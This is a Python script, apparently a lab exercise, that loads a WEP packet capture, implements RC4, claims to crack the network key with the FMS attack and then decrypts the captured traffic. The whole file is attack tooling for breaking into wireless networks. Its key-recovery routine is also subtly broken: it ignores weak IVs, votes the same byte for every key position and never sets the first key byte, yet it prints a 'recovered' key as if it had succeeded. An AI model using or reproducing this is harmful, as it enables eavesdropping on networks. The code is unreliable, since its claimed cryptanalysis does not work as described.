from scapy.all import rdpcap, Dot11WEP
import numpy as np
from itertools import cycle


# RC4 algorithm implementation for decryption
def rc4(key, data):
    S = list(range(256))
    j = 0
    out = []

    # KSA: Key-scheduling algorithm
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    # PRGA: Pseudo-random generation algorithm
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])

    return bytes(out)


# Step 1: Extract IVs and encrypted data from .cap file
def extract_ivs_and_data(capture_file):
    packets = rdpcap(capture_file)
    ivs = []
    encrypted_data = []

    for packet in packets:
        if packet.haslayer(Dot11WEP):
            iv = packet.iv
            # Payload data (encrypted part after IV)
            wep_data = packet.wepdata
            ivs.append((iv, wep_data))

    return ivs


# Step 2: Perform FMS Attack
def fms_attack(ivs, key_length=5):
    key_guess = [0] * key_length  # Initialize guessed key
    votes = [{} for _ in range(key_length)]  # Dictionary to count votes for each key byte

    for iv, wep_data in ivs:
        key_stream = list(iv) + key_guess
        decrypted_first_byte = wep_data[0] ^ rc4(key_stream, b'\x00')[0]

        for i in range(1, key_length):
            if decrypted_first_byte not in votes[i]:
                votes[i][decrypted_first_byte] = 0
            votes[i][decrypted_first_byte] += 1

    # Guess each byte based on most frequent results
    for i in range(1, key_length):
        key_guess[i] = max(votes[i], key=votes[i].get)

    return key_guess


# Step 3: Decrypt WEP traffic using the recovered key
def decrypt_wep_traffic(key, ivs):
    decrypted_packets = []

    for iv, encrypted_data in ivs:
        key_stream = list(iv) + list(key)
        decrypted_data = rc4(key_stream, encrypted_data)
        decrypted_packets.append(decrypted_data)

    return decrypted_packets


# Main function
def main():
    # capture_file = input("Enter the path to your .cap file: ")
    capture_file = "wep_64_ptw_01.cap"
    # Step 1: Extract IVs and encrypted data
    ivs = extract_ivs_and_data(capture_file)
    print(f"Extracted {len(ivs)} IVs")

    # Step 2: Perform FMS attack to crack WEP key
    wep_key = fms_attack(ivs)
    print(f"Recovered WEP key: {wep_key}")

    # Step 3: Decrypt WEP-encrypted traffic with the recovered key
    decrypted_packets = decrypt_wep_traffic(wep_key, ivs)
    print(f"Decrypted {len(decrypted_packets)} packets")

    # Save decrypted packets to a file (optional)
    # with open("decrypted_packets.txt", "wb") as f:
    #     for packet in decrypted_packets:
    #         f.write(packet)


if __name__ == "__main__":
    main()